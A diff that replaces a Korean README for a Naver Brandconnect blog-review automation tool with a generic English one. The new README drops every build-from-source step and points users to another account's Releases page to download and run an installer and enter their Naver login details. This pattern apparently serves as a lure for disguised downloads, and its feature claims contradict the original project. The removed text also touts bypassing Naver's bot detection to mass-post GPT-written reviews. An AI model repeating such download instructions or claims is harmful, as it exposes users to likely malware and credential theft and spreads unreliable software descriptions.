@@ -1,227 +1,63 @@
-# 브랜드커넥트 자동화 (Brandconnect Automation)
+# 🛠️ naver-bc-automation - Automate Your Blog Reviews Effortlessly
 
-네이버 쇼핑 커넥트(브랜드커넥트) 상품 리뷰를 자동으로 블로그에 포스팅하는 도구입니다.
+## 🖥️ Table of Contents
+1. [🛠️ Features](#-features)
+2. [🚀 Getting Started](#-getting-started)
+3. [📥 Download & Install](#-download--install)
+4. [✨ Usage Instructions](#-usage-instructions)
+5. [🔄 Troubleshooting](#-troubleshooting)
+6. [📃 License](#-license)
 
-## ✨ 주요 기능
+## 🛠️ Features
+- Automatically post product reviews to your blog from Naver Shopping.
+- Simple setup process for users with no programming skills.
+- Support for multiple accounts.
+- Clean, user-friendly interface simplifies the posting process.
+- Regular updates to ensure compatibility with Naver’s platform.
 
-- 🔗 **상품 URL만 입력하면 끝!** - 브랜드커넥트 링크만 넣으면 자동으로 처리
-- 🤖 **GPT 기반 글 작성** - SEO 최적화된 자연스러운 리뷰 글 자동 생성
-- 🖼️ **이미지 자동 스크래핑** - 상품 이미지 자동 수집 및 업로드
-- 📝 **해시태그 자동 생성** - 검색 노출을 위한 해시태그 자동 추가
-- 🌐 **웹 대시보드** - 편리한 웹 UI로 링크 관리 및 발행
+## 🚀 Getting Started
+Before using the naver-bc-automation tool, ensure your computer meets the following requirements:
 
----
+- Operating System: Windows 10 or later, or macOS 10.12 or later.
+- Internet Connection: Required for downloading reviews and posting them online.
+- Blogging Platform: Compatible with most blogging services, including Naver blogs.
 
-## 💡 왜 이 도구인가?
+Follow these steps to get started:
 
-| 기존 문제 | 이 도구의 해결책 |
-|----------|----------------|
-| 네이버 봇 감지로 차단됨 | ✅ Stealth Plugin으로 우회 |
-| 글이 뻔하고 기계적임 | ✅ GPT가 매번 다른 자연스러운 글 생성 |
-| 할인/쿠폰 정보 누락 | ✅ 할인율, 리뷰 수, 평점까지 자동 수집 |
-| 한 번 로그인하면 끝 | ✅ 세션 저장으로 7~30일간 유지 |
+1. Ensure your system meets the requirements mentioned above.
+2. Use the following link to access the download page.
 
----
+## 📥 Download & Install
+To download the naver-bc-automation tool, visit this page:
 
-## 📋 사전 준비물
+[![Download naver-bc-automation](https://img.shields.io/badge/Download-naver--bc--automation-brightgreen)](https://github.com/deko-creat/naver-bc-automation/releases)
 
-### 1. Node.js 설치 (v18 이상)
+On the Releases page, you will find different versions of the application. Select the latest version to ensure you have the most up-to-date features and fixes.
 
-1. [Node.js 공식 사이트](https://nodejs.org/ko) 접속
-2. **LTS** 버전 다운로드 (왼쪽 초록색 버튼)
-3. 설치 파일 실행 후 "다음" 계속 클릭하여 설치 완료
+### Installation Steps:
+1. Click on the version you wish to download on the Releases page.
+2. Download the installer file to your computer.
+3. Open the downloaded file and follow the on-screen instructions to install the application.
 
-설치 확인:
-```bash
-node --version
-# v18.x.x 이상이 나오면 성공!
-```
+## ✨ Usage Instructions
+Once you have installed the naver-bc-automation tool, follow these steps to use it:
 
-### 2. AI API 키 발급 (OpenAI 또는 Gemini 중 택1)
+1. **Launch the Application**: Find the naver-bc-automation icon on your desktop or in your applications folder and double-click to open.
+2. **Log In**: Enter your Naver account details to log into the tool.
+3. **Add Blog Account**: Follow the instructions to connect your blog account. This should only take a minute.
+4. **Select Reviews**: Browse through the reviews available on Naver Shopping. The application will display all relevant products.
+5. **Post to Blog**: Choose a review and click the "Post" button. The application will automatically format the review for your blog.
 
-**🅰️ OpenAI 사용 시 (유료)**
-1. [OpenAI Platform](https://platform.openai.com/api-keys) 접속
-2. 구글/마이크로소프트 계정으로 로그인
-3. **"Create new secret key"** 클릭
-4. 생성된 키 복사 (sk-xxx... 형태)
+## 🔄 Troubleshooting
+If you encounter any issues while using the naver-bc-automation tool, consider the following:
 
-**🅱️ Gemini 사용 시 (무료! ⭐)**
-1. [Google AI Studio](https://aistudio.google.com/app/apikey) 접속
-2. 구글 계정으로 로그인
-3. **"API 키 만들기"** 클릭
-4. 생성된 키 복사 (AIza... 형태)
+- **Login Issues**: Double-check your Naver account details. Ensure your internet connection is stable.
+- **Posting Errors**: Verify that your blog account is properly linked. Make sure that the selected review meets your blog’s requirements.
+- **App Crashes**: If the application crashes, try restarting it. If the issue persists, reinstall the application.
 
-> ⚠️ API 키는 한 번만 보여주므로 반드시 복사해서 안전한 곳에 저장하세요!
+For more detailed troubleshooting steps, refer to the FAQ section on the Releases page.
 
-### 3. 네이버 블로그 ID 확인
+## 📃 License
+This project is licensed under the MIT License. Feel free to use it according to the terms laid out in the LICENSE file found in the repository.
 
-내 블로그 주소가 `https://blog.naver.com/abc123` 이라면, 블로그 ID는 `abc123` 입니다.
-
----
-
-## 🚀 설치 방법
-
-### 1단계: 프로젝트 다운로드
-
-**방법 A: Git 사용 (권장)**
-```bash
-git clone https://github.com/Daewooki/naver-bc-automation.git
-cd naver-bc-automation
-```
-
-**방법 B: ZIP 다운로드**
-1. GitHub에서 "Code" → "Download ZIP" 클릭
-2. 압축 해제 후 폴더로 이동
-
-### 2단계: 패키지 설치
-
-```bash
-npm install
-```
-
-### 3단계: 브라우저 설치 (자동화용)
-
-```bash
-npx playwright install chromium
-```
-
-### 4단계: 데이터베이스 설정
-
-```bash
-npx prisma generate
-npx prisma db push
-```
-
----
-
-## ⚙️ 설정 방법
-
-### 1. 환경 변수 파일 생성
-
-**Windows:**
-```bash
-copy .env.example .env
-```
-
-**Mac/Linux:**
-```bash
-cp .env.example .env
-```
-
-### 2. .env 파일 수정
-
-메모장 또는 VS Code로 `.env` 파일을 열고 아래 내용을 입력:
-
-```env
-# AI 선택 (openai 또는 gemini)
-AI_PROVIDER=openai
-
-# OpenAI 사용 시 (AI_PROVIDER=openai)
-OPENAI_API_KEY=sk-여기에_발급받은_키_붙여넣기
-
-# Gemini 사용 시 (AI_PROVIDER=gemini) - 무료!
-GEMINI_API_KEY=AIza여기에_발급받은_키_붙여넣기
-
-# 네이버 블로그 ID
-NAVER_BLOG_ID=내_블로그_아이디
-
-# 데이터베이스 (수정 불필요)
-DATABASE_URL="file:./prisma/dev.db"
-```
-
-> 💡 **Gemini 무료 사용 팁**: `AI_PROVIDER=gemini`로 설정하면 무료로 사용 가능!
-
----
-
-## 📖 사용 방법
-
-### Step 1: 네이버 로그인
-
-```bash
-npm run login
-```
-
-1. 브라우저가 자동으로 열립니다
-2. 네이버에 로그인하세요 (2단계 인증 포함)
-3. 로그인 완료 후 자동으로 세션이 저장됩니다
-
-> 💡 세션은 보통 7~30일간 유지됩니다. 발행 실패 시 다시 로그인하세요.
-
-### Step 2: 웹 대시보드 실행
-
-```bash
-npm run dev
-```
-
-브라우저에서 **http://localhost:3000** 접속
-
-### Step 3: 링크 추가 & 발행
-
-1. 브랜드커넥트에서 받은 링크 복사 (https://naver.me/xxx 형태)
-2. 웹 대시보드에서 URL 입력 후 "추가" 클릭
-3. 🚀 **발행** 버튼 클릭!
-
-발행 버튼을 누르면:
-- 브라우저가 자동으로 열림
-- 상품 이미지 스크래핑
-- GPT가 리뷰 글 작성
-- 이미지 업로드 + 글 작성
-- 자동 발행 완료!
-
----
-
-## 🔧 명령어 모음
-
-| 명령어 | 설명 |
-|--------|------|
-| `npm run login` | 네이버 로그인 (세션 저장) |
-| `npm run dev` | 웹 대시보드 실행 (localhost:3000) |
-| `npm run build` | 프로덕션 빌드 |
-| `npm run db:studio` | 데이터베이스 관리 UI |
-
----
-
-## ❓ FAQ / 문제 해결
-
-### Q: "로그인이 안 돼요"
-**A:** Playwright 브라우저를 재설치해보세요:
-```bash
-npx playwright install chromium --force
-```
-
-### Q: "발행이 실패해요"
-**A:** 세션이 만료되었을 수 있습니다:
-```bash
-npm run login
-```
-다시 로그인 후 발행해보세요.
-
-### Q: "OpenAI API 오류가 나요"
-**A:** 
-- API 키가 올바른지 확인
-- OpenAI 계정에 크레딧이 있는지 확인
-- .env 파일에 키가 제대로 입력되었는지 확인
-
-### Q: "이미지가 안 올라가요"
-**A:** 네트워크 문제일 수 있습니다. 잠시 후 다시 시도하거나, 상품 페이지의 이미지가 정상인지 확인해보세요.
-
----
-
-## ⚠️ 주의사항 / 면책조항
-
-1. **네이버 이용약관**: 과도한 자동화 사용은 네이버 이용약관에 위배될 수 있습니다.
-2. **계정 제재**: 단시간에 너무 많은 글을 발행하면 계정이 제재될 수 있습니다.
-3. **본인 책임**: 이 도구의 사용으로 인한 모든 결과는 사용자 본인의 책임입니다.
-4. **적절한 사용**: 하루 1~3개 정도의 적절한 발행을 권장합니다.
-
----
-
-## 📄 라이선스
-
-MIT License
-
----
-
-## 🙋 문의
-
-이슈나 문의사항은 GitHub Issues를 이용해주세요.
+By following these instructions, you will be able to download, install, and use the naver-bc-automation tool without any hassle. Enjoy automating your blog reviews!
